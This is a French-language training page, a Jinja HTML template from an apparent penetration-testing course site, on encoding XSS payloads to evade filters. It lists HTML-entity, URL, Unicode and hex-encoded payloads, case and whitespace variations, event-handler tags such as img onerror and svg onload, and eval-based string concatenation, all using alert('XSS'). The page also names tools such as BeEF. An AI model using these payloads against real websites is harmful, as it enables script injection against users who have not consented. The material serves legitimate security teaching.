@@ -1,0 +1,246 @@
+{% extends "base.html" %}
+
+{% block title %}XSS - Encodage des Payloads - TestZone{% endblock %}
+
+{% block extra_css %}
+<style>
+    .content-container {
+        max-width: 800px;
+        margin: 0 auto;
+    }
+
+    .page-header {
+        text-align: center;
+        margin-bottom: 2rem;
+        padding: 1.5rem;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+    }
+
+    .content-section {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        line-height: 1.6;
+    }
+
+    .content-section h3 {
+        color: #00ff88;
+        margin-bottom: 1rem;
+        font-size: 1.3rem;
+    }
+
+    .content-section p {
+        margin-bottom: 1rem;
+        color: rgba(255, 255, 255, 0.9);
+    }
+
+    .code-block {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 5px;
+        padding: 1rem;
+        margin: 1rem 0;
+        font-family: 'Courier New', monospace;
+        color: #00ff88;
+        overflow-x: auto;
+    }
+
+    .technique-card {
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 8px;
+        padding: 1.5rem;
+        margin: 1rem 0;
+    }
+
+    .technique-title {
+        color: #00ff88;
+        font-size: 1.1rem;
+        font-weight: bold;
+        margin-bottom: 1rem;
+    }
+
+    .warning-box {
+        background: rgba(255, 193, 7, 0.2);
+        border: 1px solid rgba(255, 193, 7, 0.4);
+        border-radius: 8px;
+        padding: 1rem;
+        margin: 1rem 0;
+        color: #ffc107;
+    }
+
+    .navigation {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+    }
+
+    .page-indicator {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 0.9rem;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="content-container">
+    <div class="page-header">
+        <h1 style="color: #00ff88; margin-bottom: 0.5rem;">
+            <i class="fas fa-code"></i> Module XSS
+        </h1>
+        <h2 style="color: #ffffff;">3. Encodage des Payloads et Techniques de Contournement</h2>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-shield-alt"></i> Pourquoi encoder les payloads ?</h3>
+        <p>
+            L'encodage des payloads XSS est une technique essentielle pour contourner les mécanismes de protection 
+            mis en place par les applications web. Les filtres de sécurité recherchent souvent des motifs spécifiques 
+            comme &lt;script&gt; ou javascript:, mais peuvent être trompés par différentes techniques d'encodage.
+        </p>
+        <p>
+            L'objectif est de transformer le payload malveillant en une forme qui ne sera pas détectée par les filtres, 
+            mais qui sera toujours exécutée par le navigateur.
+        </p>
+    </div>
+
+    <div class="technique-card">
+        <div class="technique-title">
+            <i class="fas fa-hashtag"></i> Encodage HTML (Entités HTML)
+        </div>
+        <p>
+            Les entités HTML permettent de représenter des caractères spéciaux sous forme encodée.
+        </p>
+        <div class="code-block">
+&lt;!-- Payload normal --&gt;<br>
+&lt;script&gt;alert('XSS')&lt;/script&gt;<br><br>
+&lt;!-- Payload encodé en HTML --&gt;<br>
+&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;<br><br>
+&lt;!-- Encodage partiel --&gt;<br>
+&lt;scr&amp;#105;pt&gt;alert('XSS')&lt;/script&gt;
+        </div>
+    </div>
+
+    <div class="technique-card">
+        <div class="technique-title">
+            <i class="fas fa-percent"></i> Encodage URL
+        </div>
+        <p>
+            L'encodage URL transforme les caractères spéciaux en leur représentation hexadécimale.
+        </p>
+        <div class="code-block">
+&lt;!-- Payload normal --&gt;<br>
+javascript:alert('XSS')<br><br>
+&lt;!-- Payload encodé en URL --&gt;<br>
+%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%27%58%53%53%27%29<br><br>
+&lt;!-- Encodage partiel --&gt;<br>
+java%73cript:alert('XSS')
+        </div>
+    </div>
+
+    <div class="technique-card">
+        <div class="technique-title">
+            <i class="fas fa-code"></i> Encodage Unicode
+        </div>
+        <p>
+            L'encodage Unicode utilise les séquences d'échappement pour représenter les caractères.
+        </p>
+        <div class="code-block">
+&lt;!-- Payload avec encodage Unicode --&gt;<br>
+&lt;script&gt;\u0061\u006c\u0065\u0072\u0074('XSS')&lt;/script&gt;<br><br>
+&lt;!-- Encodage hexadécimal --&gt;<br>
+&lt;script&gt;\x61\x6c\x65\x72\x74('XSS')&lt;/script&gt;
+        </div>
+    </div>
+
+    <div class="technique-card">
+        <div class="technique-title">
+            <i class="fas fa-compress"></i> Techniques de Contournement
+        </div>
+        <p>
+            Diverses techniques peuvent être utilisées pour contourner les filtres de sécurité :
+        </p>
+        
+        <p><strong>1. Variation de casse :</strong></p>
+        <div class="code-block">
+&lt;ScRiPt&gt;alert('XSS')&lt;/ScRiPt&gt;<br>
+&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;
+        </div>
+
+        <p><strong>2. Espaces et caractères de contrôle :</strong></p>
+        <div class="code-block">
+&lt;script &gt;alert('XSS')&lt;/script&gt;<br>
+&lt;script	&gt;alert('XSS')&lt;/script&gt;<br>
+&lt;script
+&gt;alert('XSS')&lt;/script&gt;
+        </div>
+
+        <p><strong>3. Balises alternatives :</strong></p>
+        <div class="code-block">
+&lt;img src=x onerror=alert('XSS')&gt;<br>
+&lt;svg onload=alert('XSS')&gt;<br>
+&lt;body onload=alert('XSS')&gt;<br>
+&lt;iframe src=javascript:alert('XSS')&gt;
+        </div>
+
+        <p><strong>4. Concaténation de chaînes :</strong></p>
+        <div class="code-block">
+&lt;script&gt;eval('ale'+'rt("XSS")')&lt;/script&gt;<br>
+&lt;script&gt;window['ale'+'rt']('XSS')&lt;/script&gt;<br>
+&lt;script&gt;setTimeout('ale'+'rt("XSS")',0)&lt;/script&gt;
+        </div>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-tools"></i> Outils d'encodage</h3>
+        <p>
+            Plusieurs outils peuvent aider à encoder et tester des payloads XSS :
+        </p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li><strong>Burp Suite :</strong> Decoder et encoder intégrés</li>
+            <li><strong>OWASP ZAP :</strong> Fonctions d'encodage multiples</li>
+            <li><strong>XSSHunter :</strong> Plateforme de test XSS</li>
+            <li><strong>BeEF :</strong> Framework d'exploitation de navigateur</li>
+            <li><strong>Encodeurs en ligne :</strong> Outils web gratuits</li>
+        </ul>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-lightbulb"></i> Conseils pratiques</h3>
+        <p>
+            Lors de tests de pénétration, gardez à l'esprit ces bonnes pratiques :
+        </p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li>Testez plusieurs techniques d'encodage en combinaison</li>
+            <li>Analysez le code source pour comprendre les filtres en place</li>
+            <li>Utilisez les outils de développement du navigateur pour déboguer</li>
+            <li>Documentez les payloads qui fonctionnent pour référence future</li>
+            <li>Respectez toujours les limites légales et éthiques</li>
+        </ul>
+    </div>
+
+    <div class="warning-box">
+        <strong><i class="fas fa-exclamation-triangle"></i> Rappel important :</strong> 
+        Ces techniques doivent uniquement être utilisées dans un cadre légal et éthique, 
+        sur des systèmes pour lesquels vous avez une autorisation explicite de test.
+    </div>
+
+    <div class="navigation">
+        <a href="/module/xss/page/2" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Page précédente
+        </a>
+        
+        <div class="page-indicator">
+            Page 3 sur 4
+        </div>
+        
+        <a href="/module/xss/quiz" class="btn">
+            Quiz <i class="fas fa-question-circle"></i>
+        </a>
+    </div>
+</div>
+{% endblock %}
+
